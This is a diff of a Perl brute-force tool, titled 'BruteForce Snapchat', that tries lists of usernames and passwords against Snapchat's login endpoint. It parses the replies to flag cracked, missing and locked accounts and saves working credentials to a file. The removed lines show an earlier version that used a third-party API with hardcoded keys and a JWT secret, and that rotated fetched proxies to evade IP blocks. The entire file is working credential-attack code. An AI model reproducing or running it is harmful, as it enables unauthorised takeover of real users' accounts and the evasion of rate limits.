@@ -1,13 +1,12 @@
 ##########################################
 use LWP::UserAgent; # ppm install LWP::UserAgent
-use JSON::WebToken; # ppm install JSON::WebToken
 ##########################################
 system('clear');
 system('cls');
 system('color 5');
 print qq(
 ################################
-#   [Casper API] BF SC API     #
+#      BruteForce Snapchat     #
 ################################
 #     Coded By 1337r00t        #
 ################################
@@ -51,71 +50,50 @@ foreach $username (@USERS) {
 chomp $username;
 	foreach $password (@PASSS) {
 	chomp $password;
-		$jwt = JSON::WebToken->encode({
-			sub => 'Joe',
-			username => $username,
+		$snapchat = LWP::UserAgent->new();
+		$snapchat->default_header('Accept-Language' => "en;q=0.9");
+		$snapchat->default_header('User-Agent' => "Snapchat/8.2.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)");
+		$response = $snapchat->post('https://feelinsonice-hrd.appspot.com/loq/login',
+			{ 
 			password => $password,
-			iat => time,
-		}, 'f3cdf4bbf206f5d572c6db13757c06fe');
-			$casper = LWP::UserAgent->new();
-			$casper->default_header('X-Casper-API-Key' => "dd3779d571409a67743c7e0e18a2cc04");
-			$casper->default_header('Content-Type' => "application/x-www-form-urlencoded; charset=UTF-8");
-			$casper->default_header('User-Agent' => "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)");
-			$casper->default_header('Connection' => "Keep-Alive");
-			$requests = $casper->post('https://casper-api.herokuapp.com/snapchat/ios/login',{ jwt => $jwt });
-			if ($requests->content=~ /"code":200/) {
-				$prx = LWP::UserAgent->new();
-				$regex = $prx->get('https://gimmeproxy.com/api/getProxy');
-				$snapchat = LWP::UserAgent->new();
-				$snapchat->default_header('X-Snapchat-Client-Token' => $requests->content=~ /"X-Snapchat-Client-Token":"(.+?)"/ );
-				$snapchat->default_header('User-Agent' => $requests->content=~ /"User-Agent":"(.+?)"/ );
-				$snapchat->default_header('X-Snapchat-Client-Auth-Token' => $requests->content=~ /"X-Snapchat-Client-Auth-Token":"(.+?)"/ );
-				$snapchat->default_header('Accept-Language' => "en-NZ;q=1");
-				$snapchat->env_proxy;
-				$snapchat->proxy(['http', 'socks5'], $regex->content=~ /"curl":"(.+?)"/ );
-				$response = $snapchat->post('https://auth.snapchat.com/scauth/login',
-					{ 
-					password => $password,
-					timestamp => $requests->content=~ /"timestamp":"(.*?)"/,
-					username => $username,
-					req_token => $requests->content=~ /"req_token":"(.*?)"/
-					}
-					);
-				if ($response->content=~ /"logged":true,/) {
-					print "Cracked -> ($username:$password)/ Proxy: ";
-					print $regex->content=~ /"curl":"(.+?)"/;
-					print "\n";
-					open(R0T,">>Cracked.txt");
-					print R0T "\n($username:$password)\n";
-					close(R0T);
-					sleep(3);
+			req_token => '9300a1585ce1b2f86e0903e7f0a890046eed4d8119e34a8709b4c614d9c5165b',
+			timestamp => '1506271406216',
+			username => $username
+			}
+			);
+		if ($response->content=~ /using a version of Snapchat or operating system/) {
+			print "Cracked -> ($username:$password)\n";
+			open(R0T,">>Cracked.txt");
+			print R0T "\n($username:$password)\n";
+			close(R0T);
+		}
+		else
+		{
+			if ($response->content=~ /not the right password./) {
+				print "Failed -> ($username:$password)\n";
+			}
+			else
+			{
+				if ($response->content=~ /find an account with that username./) {
+					print "NotFound -> ($username)\n";
 				}
 				else
 				{
-					if ($response->content=~ /not the right password/) {
-						print "Failed -> ($username:$password)/ Proxy: ";
-						print $regex->content=~ /"curl":"(.+?)"/;
-						print "\n";
+					if ($response->content=~ /Invalid account/) {
+						print "Invalid account -> ($username)\n";
 					}
 					else
 					{
-						if ($response->content=~ /find an account with that username./) {
-							print "Username Not Found -> ($username)/ Proxy: ";
-							print $regex->content=~ /"curl":"(.+?)"/;
-							print "\n";
+						if ($response->content=~ /Due to repeated failed login attempts or other suspicious activity/) {
+							print "Block bruting only this user -> ($username)";
 						}
 						else
 						{
-							print "Sorry, Blocked IP for many Requests/ Proxy: ";
-							print $regex->content=~ /"curl":"(.+?)"/;
-							print "\n";
+							print "Blocked Your IP for Requests";
 						}
 					}
 				}
 			}
-			else {
-				print "JWT [Casper API] Error\n";
-			}
-		
+		}
 	}
 }
